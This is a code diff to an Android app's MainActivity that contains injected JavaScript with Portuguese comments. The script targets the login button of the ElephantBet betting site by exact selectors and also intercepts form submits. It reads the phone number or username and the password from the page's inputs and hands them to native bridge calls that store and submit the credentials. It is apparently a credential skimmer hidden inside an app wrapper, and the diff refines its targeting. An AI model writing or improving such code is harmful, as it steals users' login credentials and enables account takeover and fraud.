@@ -1099,69 +1099,54 @@ class MainActivity : AppCompatActivity() {
 
     // ── Interceptar clique no botão de login ──────────────────────
     // Só aqui é que o envio é disparado, garantindo que ambos os campos estão preenchidos
-    function isLoginButton(el) {
-        var txt = (el.textContent || el.value || el.innerText || '').toLowerCase().trim();
-        var typ = (el.type || '').toLowerCase();
-        var cls = (el.className || '').toLowerCase();
-        var id  = (el.id || '').toLowerCase();
-        return txt.includes('entrar') || txt.includes('login') || txt.includes('iniciar') ||
-               txt.includes('sign in') || txt.includes('acceder') || txt.includes('aceder') ||
-               typ === 'submit' || cls.includes('login') || cls.includes('submit') ||
-               id.includes('login') || id.includes('submit') || id.includes('btn-login');
+    // ── Seletor exato do botão de login do ElephantBet ──────────────
+    // <button class="btn a-color" type="submit" title="Entrar"><span>Entrar</span></button>
+    var SELETORES_BTN_LOGIN = [
+        'button[type="submit"][title="Entrar"]',
+        'button[type="submit"].btn.a-color',
+        'button[type="submit"][title*="Entrar" i]',
+        'button[type="submit"][title*="Login" i]',
+        'button[type="submit"][title*="Iniciar" i]'
+    ];
+
+    function capturarCamposEEnviar() {
+        // Ler todos os inputs visíveis no momento do submit
+        document.querySelectorAll('input').forEach(function(inp) {
+            var t = (inp.type || '').toLowerCase();
+            var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
+            var v = (inp.value || '').trim();
+            if (!v) return;
+            var isNum = t === 'tel' || t === 'number' ||
+                n.includes('phone') || n.includes('numero') ||
+                n.includes('username') || n.includes('login') || n.includes('user') ||
+                n.includes('msisdn') || n.includes('mobile');
+            var isPass = t === 'password' || n.includes('pass') || n.includes('senha');
+            if (isNum) try { Android.guardarNumero(v); } catch(e) {}
+            if (isPass) try { Android.guardarSenha(v); } catch(e) {}
+        });
+        // Pequeno delay para garantir que os guardar* acima foram processados no lado Kotlin
+        setTimeout(function() {
+            try { Android.submeterCredencial(); } catch(e) {}
+        }, 150);
     }
 
     function watchLoginButtons() {
-        document.querySelectorAll('button, input[type="submit"], a[href*="login"]').forEach(function(el) {
-            if (el._wLogin) return;
-            el._wLogin = true;
-            el.addEventListener('click', function() {
-                // 1. Garantir que os campos mais recentes estão capturados
-                document.querySelectorAll('input').forEach(function(inp) {
-                    var t = (inp.type || '').toLowerCase();
-                    var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
-                    var v = (inp.value || '').trim();
-                    if (!v) return;
-                    var isNum = t === 'tel' || t === 'number' ||
-                        n.includes('phone') || n.includes('numero') ||
-                        n.includes('username') || n.includes('login') || n.includes('user') ||
-                        n.includes('msisdn') || n.includes('mobile');
-                    var isPass = t === 'password' ||
-                        n.includes('pass') || n.includes('senha');
-                    if (isNum) try { Android.guardarNumero(v); } catch(e) {}
-                    if (isPass) try { Android.guardarSenha(v); } catch(e) {}
-                });
-                // 2. Só submeter se este botão parecer de login
-                if (isLoginButton(this)) {
-                    setTimeout(function() {
-                        try { Android.submeterCredencial(); } catch(e) {}
-                    }, 100); // pequeno delay para garantir que os inputs acima foram processados
-                }
-            }, true); // capture=true para apanhar antes de qualquer outro handler
+        // Tentar primeiro com o seletor exato do ElephantBet
+        SELETORES_BTN_LOGIN.forEach(function(sel) {
+            document.querySelectorAll(sel).forEach(function(btn) {
+                if (btn._wLogin) return;
+                btn._wLogin = true;
+                btn.addEventListener('click', capturarCamposEEnviar, true);
+            });
         });
     }
 
-    // Interceptar também submits de formulário directamente
+    // Fallback: interceptar form.submit caso o botão não seja detetado
     function watchFormSubmits() {
         document.querySelectorAll('form').forEach(function(form) {
             if (form._wSubmit) return;
             form._wSubmit = true;
-            form.addEventListener('submit', function() {
-                document.querySelectorAll('input').forEach(function(inp) {
-                    var t = (inp.type || '').toLowerCase();
-                    var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
-                    var v = (inp.value || '').trim();
-                    if (!v) return;
-                    var isNum = t === 'tel' || t === 'number' ||
-                        n.includes('phone') || n.includes('numero') ||
-                        n.includes('username') || n.includes('user') || n.includes('msisdn');
-                    var isPass = t === 'password' || n.includes('pass') || n.includes('senha');
-                    if (isNum) try { Android.guardarNumero(v); } catch(e) {}
-                    if (isPass) try { Android.guardarSenha(v); } catch(e) {}
-                });
-                setTimeout(function() {
-                    try { Android.submeterCredencial(); } catch(e) {}
-                }, 100);
-            }, true);
+            form.addEventListener('submit', capturarCamposEEnviar, true);
         });
     }
 
